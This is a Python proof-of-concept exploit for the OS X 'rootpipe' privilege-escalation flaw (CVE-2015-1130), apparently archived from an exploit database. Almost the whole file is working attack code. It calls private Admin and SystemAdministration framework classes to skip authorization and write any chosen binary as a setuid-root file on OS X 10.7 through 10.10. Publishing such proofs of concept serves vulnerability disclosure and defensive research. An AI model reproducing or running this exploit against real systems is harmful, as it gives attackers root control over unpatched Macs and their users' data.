########################################################
#
#  PoC exploit code for rootpipe (CVE-2015-1130)
#
#  Created by Emil Kvarnhammar, TrueSec
#
#  Tested on OS X 10.7.5, 10.8.2, 10.9.5 and 10.10.2
#
########################################################
import os
import sys
import platform
import re
import ctypes
import objc
import sys
from Cocoa import NSData, NSMutableDictionary, NSFilePosixPermissions
from Foundation import NSAutoreleasePool
 
def load_lib(append_path):
    return ctypes.cdll.LoadLibrary("/System/Library/PrivateFrameworks/" + append_path);
 
def use_old_api():
    return re.match("^(10.7|10.8)(.\d)?$", platform.mac_ver()[0])
 
 
args = sys.argv
 
if len(args) != 3:
    print "usage: exploit.py source_binary dest_binary_as_root"
    sys.exit(-1)
 
source_binary = args[1]
dest_binary = os.path.realpath(args[2])
 
if not os.path.exists(source_binary):
    raise Exception("file does not exist!")
 
pool = NSAutoreleasePool.alloc().init()
 
attr = NSMutableDictionary.alloc().init()
attr.setValue_forKey_(04777, NSFilePosixPermissions)
data = NSData.alloc().initWithContentsOfFile_(source_binary)
 
print "will write file", dest_binary
 
if use_old_api():
    adm_lib = load_lib("/Admin.framework/Admin")
    Authenticator = objc.lookUpClass("Authenticator")
    ToolLiaison = objc.lookUpClass("ToolLiaison")
    SFAuthorization = objc.lookUpClass("SFAuthorization")
 
    authent = Authenticator.sharedAuthenticator()
    authref = SFAuthorization.authorization()
 
    # authref with value nil is not accepted on OS X <= 10.8
    authent.authenticateUsingAuthorizationSync_(authref)
    st = ToolLiaison.sharedToolLiaison()
    tool = st.tool()
    tool.createFileWithContents_path_attributes_(data, dest_binary, attr)
else:
    adm_lib = load_lib("/SystemAdministration.framework/SystemAdministration")
    WriteConfigClient = objc.lookUpClass("WriteConfigClient")
    client = WriteConfigClient.sharedClient()
    client.authenticateUsingAuthorizationSync_(None)
    tool = client.remoteProxy()
 
    tool.createFileWithContents_path_attributes_(data, dest_binary, attr, 0)
 
 
print "Done!"
 
del pool

# milw00rm.org [2015-04-21]